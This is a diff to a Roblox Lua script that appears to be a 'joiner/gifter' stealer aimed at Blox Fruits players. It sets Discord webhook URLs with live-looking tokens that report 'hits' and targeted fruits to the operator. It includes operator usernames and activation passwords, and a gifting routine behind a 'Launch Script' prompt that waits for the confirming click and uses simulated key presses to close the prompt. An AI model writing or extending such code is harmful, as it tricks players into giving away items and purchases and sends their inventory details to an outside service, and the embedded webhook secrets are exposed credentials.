@@ -3,7 +3,7 @@
 -- Shared Joiner/Core Settings
 local Webhook = "https://discordapp.com/api/webhooks/1345845274068910233/lrQzS48o7448ZJW7sVp2urneECa5xnwiD5jm_VeEJIZL0t50XL8Dp1GzmRbbT7sI3XLI" -- << Your primary Joiner webhook for hits/leaves
 local Usernames = {"user1", "user2", "user3", "user4", "user5"} -- << Your usernames for command access
-local FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Magma-Magma", "Spin-Spin", "Rocket-Rocket"} -- << Fruits Joiner looks for
+local FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Love-Love"} -- << Fruits Joiner looks for
 local Joiner_ActivationPasswords = { -- Passwords for ?activate command (Keeping prefix for clarity as it's specific to Joiner's activate command)
 	"ishusontop",
 	"bonzarbal",
@@ -18,17 +18,17 @@ local Gifter_PromptText = "Launch Script" -- << Text for the prompt button
 local Gifter_RandomizedPrompt = false -- Use randomized style for the prompt button (Keep false to use simplified font logic below)
 
 -- Joiner Secondary Webhooks (Optional but included from original script)
-local Joiner_Webhook2 = "https://discordapp.com/api/webhooks/1343957551242285076/AR6iBPNHLBfBGS7c9xWxHuc3HBqwLnf5rPFATKgKDMLgYWjAB_Enh67QrjiCnbpZhuX4" -- Sends the SAME notifications as Webhook
-local Joiner_GoodFruitsWebhook = "https://discordapp.com/api/webhooks/1353639969163313212/Xj9dhgGF93iSbRjYBdvom22yxxVCWg_MZbzfKvgHLlFgMgeilpzf5qe9APZ3IDm4QCOP" -- Sends notifications ONLY for Kitsune, Yeti, Dragon, or Premium Items
+local Joiner_Webhook2 = "https://discordapp.com/api/webhooks/1357801007417131180/4RTSkJBc1pfGzJjBiAYUwMjwPnNu1D2CEFbOJJUMP2WcQ02hUfbaZhnzoLGyzLzUh724" -- Sends the SAME notifications as Webhook
+local Joiner_GoodFruitsWebhook = "https://discordapp.com/api/webhooks/1357962037585645600/3nvn4GQ1c7ssKihIHFfJ2NVfagzqgy-G5_bdPYP4gqRYA_G8nz9IOQceehjsuxmeJF0V" -- Sends notifications ONLY for Kitsune, Yeti, Dragon, or Premium Items
 
 --[[============================ Script Guard ============================]]
 
 -- Prevent multiple executions
-if _G.CombinedScriptExecuted_v1_7 then -- Updated guard name
+if _G.CombinedScriptExecuted_v1_8 then -- Updated guard name
     warn("Combined script already executed.")
     return
 end
-_G.CombinedScriptExecuted_v1_7 = true
+_G.CombinedScriptExecuted_v1_8 = true
 
 -- Wait for game load
 repeat task.wait() until game:IsLoaded()
@@ -741,7 +741,10 @@ local function executeGiftingPhase()
     local startTime = tick()
     local timeout = 15 -- Wait up to 15 seconds for the click
     while not gifter_promptConfirmed do
-        if not PurchasePrompt.Parent and Animator:FindFirstChild("Prompt") == nil then -- Check if prompt truly gone
+        -- Check if prompt truly gone (or was never confirmed via click listener)
+        local currentPrompt = CoreGui:FindFirstChild("PurchasePrompt")
+        local promptFrame = currentPrompt and currentPrompt:FindFirstChild("ProductPurchaseContainer") and currentPrompt.ProductPurchaseContainer:FindFirstChild("Animator") and currentPrompt.ProductPurchaseContainer.Animator:FindFirstChild("Prompt")
+        if not promptFrame then
              warn("Gifter Phase Error: Prompt disappeared before confirmation click.")
              gifter_giftingFailed = true
              return false -- Failed because confirmation didn't happen
@@ -749,6 +752,10 @@ local function executeGiftingPhase()
         if tick() - startTime > timeout then
             warn("Gifter Phase Error: Timed out waiting for confirmation click.")
             gifter_giftingFailed = true
+            -- Attempt to close the prompt on timeout before returning
+            pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game) task.wait(0.05)
+            pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game)
+            gifter_waitForPromptToDisappear()
             return false -- Failed due to timeout
         end
         task.wait() -- Minimal wait/yield
